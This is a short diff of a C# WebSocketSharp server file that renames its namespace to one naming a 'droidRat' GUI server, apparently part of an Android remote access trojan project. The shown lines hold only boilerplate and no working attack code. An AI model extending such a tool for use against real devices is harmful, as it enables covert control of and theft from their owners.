@@ -1,7 +1,7 @@
 ﻿using WebSocketSharp;
 using WebSocketSharp.Server;
 
-namespace WebSocket_JE
+namespace CSharp_droidRat_GUI_Server.Module.webSocket
 {
     public class WebSocket : WebSocketBehavior
     {
